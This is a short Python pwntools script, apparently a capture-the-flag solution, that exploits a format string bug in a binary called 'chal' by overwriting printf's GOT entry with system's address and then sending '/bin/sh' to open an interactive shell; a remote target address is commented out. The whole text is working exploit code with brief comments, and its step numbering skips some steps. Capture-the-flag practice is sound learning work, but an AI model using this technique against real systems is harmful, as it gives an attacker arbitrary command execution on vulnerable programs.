from pwn import *

elf = ELF('./chal')
# io = remote('10.21.232.223', 57562) #
io = process('./chal') # Test locally first

# We want to overwrite the GOT entry of a function called during/after the confirmation
target_got = elf.got['printf']     # e.g., 0x403390
magic_target = elf.plt['system']   # The address of system()

# 3. Build the format string payload at offset 6
# This automatically creates the string that writes magic_target into target_got
offset = 6
payload = fmtstr_payload(offset, {target_got: magic_target})

io.sendlineafter(b"What is your name?", payload)

# 5. Send the execution string to the second prompt
io.sendlineafter(b"confirmation", b"/bin/sh")

# 6. Keep the session open so you can interact with the shell
io.interactive()
